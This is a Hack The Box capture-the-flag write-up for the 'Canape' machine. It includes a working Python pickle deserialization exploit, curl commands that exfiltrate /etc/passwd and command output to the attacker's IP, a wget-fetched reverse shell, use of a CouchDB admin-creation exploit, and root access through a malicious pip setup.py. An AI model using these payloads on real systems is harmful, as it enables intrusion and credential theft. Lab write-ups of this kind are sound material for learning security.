# Hack The Box: Canape machine write-up

This is by far the funniest and most educative machine I've rooted on HackTheBox. You start enumerating a git repository which leaks the source of the app running and that gives you an entry point through the python pickle. Then, as you can't get a shell, only RCE, you need to creatively figure out a way to extract data in order to escalate to user. Let's dig in!

## Enumeration

The machine runs with ip 10.10.10.70. I start by enumerating open ports to discover the services running in the machine. I ran the following:

```sh
nmap -sC -sV -oA nmap/initial 10.10.10.70
```

Which resulted in:

```console
# Nmap 7.01 scan initiated Thu Sep  6 16:31:10 2018 as: nmap -sV -sC -oA nmap/initial 10.10.10.70
Nmap scan report for 10.10.10.70
Host is up (0.047s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git:
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  6 16:31:39 2018 -- 1 IP address (1 host up) scanned in 29.43 seconds
```

So no SSH this time. That means we won't be able to get the user's private keys and log in once we get to user. That said, the nmap scan found a web app listening on port 80 (the only service available) with a public git repository. Looks like we found our entry point!

## Further enumaration

We start by inspecting the website, comprised of a home page which states its functionality, a quotes page and a submit page. It basically is a website with a database to store quotes from 'the simpsons'. One important thing to notice is that it uses CouchDB, a fact that will come in handy in the future.

*Home page*

![Img](images/page1.png "Img")

*See quotes page*

![Img](images/page2.png "Img")

*Submit quotes page*

![Img](images/page3.png "Img")

*Submit message*

![Img](images/page4.png "Img")

Apart from that, we see nothing too interesting, just a comment on the source code making a reference to the ``/check`` page. However, we get a ``Method Not Allowed`` message when we visit it.

Time to take a look at the git repository. In order to do so, I used a tool called [GitTools](https://github.com/internetwache/GitTools) that lets me download everything from the repository (basically like a clone).

*Download command and output*

![Img](images/dump.png "Img")

*Git status and log (as there was no file on the directory)*

![Img](images/recon.png "Img")

*Recovered file with checkout*

![Img](images/checkout.png "Img")

And we found the app source code! Some remarks are:

* It uses a CouchDB database running locally on port 5984.
* The submit option has a few requirements:
	* There must appear the name of a character in the series in the char field.
	* Neither field must be empty.
* Both sets of data get added together and written to a file in the ``/tmp`` directory.
* The name of that file is a digested md5 hash but the extension is a pickle one (``.p``).

But the most important thing to notice is the following:

* The check page, which only accepts POST data (hence the Not Allowed from before) through an ``id`` param, reads the data from the file and if it contains a substring (``p1``) unpickles the contents. Otherwise, it just prints it.

```py
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5

app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

We found our attack vector, for the cPickle library has vulnerabilities with the loads function.

## Exploit

The first thing I did was create a Python script in order to mimic the server code and bypass its checks:

```py
import sys
from hashlib import md5

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

char = sys.argv[1]
quote = sys.argv[2]

if not char or not quote:
	print "Error 1"
	sys.exit()
elif not any(c.lower() in char.lower() for c in WHITELIST):
	print "Error 2"
	sys.exit()
data = open("backup.p", "rb").read()
if not "p1" in data:
	print "Error 3"
	sys.exit()

else:
	p_id = md5(char + quote).hexdigest()
	print p_id
```

That way I could check if my input was valid and, if so, get the location of the file created on the server. Then, I would go into the website, submit the data, and go to Burp to send the md5 hash.

I also found some code from a [website](https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html) that showed how to exploit the loads function from cPickle:

```py
import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('echo Powned', ))
pickle_data = pickle.dumps(EvilPickle())
with open("backup.data", "wb") as file:
    file.write(pickle_data)
```

As the article said, when testing this locally, only Powned would be printed to the screen. I tried many combinations and functions, but nothing worked, I only got 500 Internal Errors. After many failed attempt, I concluded this process was time consuming and unsuccessful, for either I got the ``Still reviewing: + content`` message or the 500 error.

## Exploit 2.0

I decided to automate everything with a python script so that I could try things easily and faster than before.

```py

import pickle, os, sys
from hashlib import md5

class EvilPickle(object):
    def __reduce__(self):
	       return (os.system, ('echo Powned', ))
pickle_data = pickle.dumps(EvilPickle())
with open("backup.p", "wb") as file:
    print "------------------------\n"
    print char + pickle_data
    print "------------------------\n"
    file.write(char + pickle_data)
    file.close()

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

char = 'Homerp1'

with open("backup.p", "r") as file2:
	quote = pickle_data
if not char or not quote:
	print "Error 1"
	sys.exit()
elif not any(c.lower() in char.lower() for c in WHITELIST):
	print "Error 2"
	sys.exit()
data = open("backup.p", "rb").read()
if not "p1" in data:
	print "Error 3"
	sys.exit()

else:
	p_id = md5(char + quote).hexdigest()
  print p_id

# REQUESTS TO DO THE SUBMIT AND CHECK PART

import requests

url = "http://10.10.10.70/submit"
data= {
	'character':char,
	'quote':quote
    }
if "Success" in requests.post(url, data=data).text:
	print "Success posting data: {}, {}".format(char, quote)

url = "http://10.10.10.70/check"
data= {
        'id': p_id
    }
print requests.post(url, data=data).text
```

This automated EVERYTHING!!

However, it wouldn't work and the 500 Internal Error kept appearing... I was starting to get confused, this was the only method to exploit pickle I had found and it was not working...

*Script not working*

![Img](images/exp2.0.png "Img")

That's when I realized that I wasn't actually unpacking the exploit code, but the ``Homerp1`` string + the exploit code! That's why it wasn't working and throwing an error. In fact, I tested it locally and that was the issue.

In order to keep the ``Homer`` string in the char variable I though about doing the following. First of all, I would add the string to the command run in the OS, but separated by a semicolon (as if they were two commands). That way, the first one would execute (the exploit), and the second result in an error. Besides, as the pickle exploit was several lines long, I could generate it, split it based on the newline characters (``\n``), then assign the first few lines (joined again with newlines) until the ``Homer`` string to the char variable and let the rest be the quote.

Translated in code...

```py
class EvilPickle(object):
    def __reduce__(self):
	       return (os.system, ('echo Powned;homerp1', ))
data = pickle.dumps(EvilPickle())
char = ("\n").join(data.split("\n")[:4])
pickle_data = ("\n").join(data.split("\n")[4:])
```

However, as I was still getting 500 errors, I thought about changing the exploit to somethin else, like a ``ping``. Finally I got the following (I added the char before 'cause it was always the same and the only thing that changed was my payload, so I could change it manually from the variable).

```py
char = """cposix
system
p0
(S'ping -c 5 10.10.14.143;homerp1'
"""

class EvilPickle(object):
    def __reduce__(self):
	       return (os.system, ('ping -c 4 10.10.14.143;homerp1', ))
data = pickle.dumps(EvilPickle())
pickle_data = ("\n").join(data.split("\n")[4:])
```

What this command does is send 5 packets to my computer. That way I'll know if the exploit works correctly in spite of the 500 error.

In order to listen in my local VM I used this command:

```
sudo tcpdump -itun0 icmp
```

*Output from test*

![Img](images/packets.png "Img")

IT WORKS! Finally we got RCE! Now I had to figure out ways to exploit this vulnerability.

## Getting to user - data extraction

### Python's SimpleHTTPServer

First of all, it ocurred to me I could get data just by making curl requests to my computer with files that were outputs of commands:

*Getting data from SimpleHTTPServer*

![Img](images/simple_server_data.png "Img")

Thanks to this method I found out that I was executing commands as ``www-data`` (meaning I couldn't read the user flag) and that the user of the machine was ``Homer``.

### Curl to send files

Then, I though about getting files, so I looked at curl and found a way to get these. Hence, I modified my script in order to execute the command I wanted:

```py
cmd = "curl --form 'fileupload=@/etc/passwd' 10.10.14.143:8001"

char = """cposix
system
p0
(S'{};homerp1'
""".format(cmd)
```

There was just one problem, I needed something in order to get the data from the POST request. I googled a bit and found a [simple python server](https://gist.github.com/kylemcdonald/3bb71e4b901c54073cbc) that listened to these kind of requests:

*Output from the curl POST command*

![Img](images/etc_passwd.png "Img")

Now I just needed something to get the output from commands that printed data in multiple lines, like ``ls -al``.

### {Command} + Piped output + Curl POST

I though I could pipe the command's output to a file and then send the file to my machine with the previous method. The code was:

```py
cmd = "ls -al / > /tmp/tmp1; curl --form 'filename=@/tmp/tmp1' 10.10.14.143:8001"
```

*List of the root directory*

![Img](images/root_dir.png "Img")

### Getting a reverse shell

I grew tired of these methods and decided to get a shell (simple reverse shell from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)):

1. Get the code using wget and store the file in ``/tmp`` (where we have write permissions). I needed to do ``which curl`` to get the path of the executable, otherwise it wouldn't work.

```py
cmd = "cd /tmp; /usr/bin/wget 10.10.14.143:8002/shell.py;"
```

2. Listen on the local computer with ``nc -lnvp {port}``
3. Execute the reverse shell we uploaded with the RCE.

```py
cmd = "cd /tmp; python shell.py;"
```

*Reverse shell spawned!*

![Img](images/rev_shell.png "Img")

Then, as we know python is installed, we can upgrade to a tty shell:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Getting to user

The first thing that came to my mind was the CouchDB used by the web app. Maybe it had on it some creds?

I tried to get some data from it but always failed because I didn't have an authorized user:

```console
www-data@canape:/tmp$ curl -s http://localhost:5984/_users/_all_docs
curl -s http://localhost:5984/_users/_all_docs
{"error":"unauthorized","reason":"You are not a server admin."}
```

So I searched on the internet for ways to exploit the service, and found two python scripts that let me create an admin user. I tried with [this](https://www.exploit-db.com/exploits/44913/) one and the following command:

```console
www-data@canape:/tmp$ python ex.py --priv -u root3u -p password -c whoami http://127.0.0.1:5984
<n ex.py --priv -u root3u -p password -c whoami http://127.0.0.1:5984        
[*] Detected CouchDB Version 2.0.0
[+] User root3u with password password successfully created.
[+] Created payload at: http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
[+] Command executed: whoami
[*] Cleaning up.
```

As it said that I needed to provide a command, I used ``whoami``, which had a simple output. However, when I visied the url I still got unautorized access. After a few google searches, I learnt I needed to pass the user and password along with the URL, and this time I was authenticated. The only problem was the file didn't exist.

```console
www-data@canape:/tmp$ curl http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
<http://127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd     
{"error":"unauthorized","reason":"You are not a server admin."}
www-data@canape:/tmp$ http://root3u:password@127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd
<1:5984/_node/couchdb@localhost/_config/query_servers/cmd                    
bash: http://root3u:password@127.0.0.1:5984/_node/couchdb@localhost/_config/query_servers/cmd: No such file or directory
```

I went back to google and got a few interesting URLs to check:

```console
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/simpsons/_all_docs
<-X GET http://root3u:password@localhost:5984/simpsons/_all_docs             
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```

I thought it was something useful, but it turned out they were quotes... So I decided to check on all the databases present:

```console
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/_all_dbs          
<-X GET http://root3u:password@localhost:5984/_all_dbs                       
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

This is it! A database called ``passwords``!

```console
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/passwords/_all_docs
<-X GET http://root3u:password@localhost:5984/passwords/_all_docs            
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
<ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738               
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
<ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d               
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
<ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f               
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
www-data@canape:/tmp$ curl -X GET http://root3u:password@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
<ord@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4               
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
```

I tried with that last password, as it said something about SSH and had no user, so I was curious. And voilà!! I was Homer!

```console
www-data@canape:/tmp$ su homer
su homer
Password: 0B4jyA0xtytZi7esBNGp

homer@canape:/tmp$ cd /home/homer   
cd /home/homer
homer@canape:~$ cat user.txt
cat user.txt
bce918696f293e62b2321703bb27288d
```

## Privilege escalation

Privilege escalation was much more straightforward than getting to user. As always, I check for sudo commands I can run:

```console
homer@canape:~$ sudo -l
sudo -l
[sudo] password for homer: 0B4jyA0xtytZi7esBNGp

Matching Defaults entries for homer on canape:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

Chara! Way to root found! I just had to google and find this [article](https://github.com/0x00-0x00/FakePip) that explained how to get to root. However, I didn't do it like that. Instead, I decided to do a ``passwd`` and set the root password to 1. The contents of my setup.py were:

```py
import os
os.system('passwd')
```

I executed it and, as it looked as if it had hung, I tried typing in the 1, then again, and output came back! Later I figured out why this had happened: whenever you execute the command you're asked to type the password and then re-type it, so that's why I needed to type it twice.

*Steps to get to root*

![Img](images/root1.png "Img")

![Img](images/root2.png "Img")

---

And that was all! I hope you enjoyed reading and learnt a few things!

---

*Diego Bernal Adelantado*
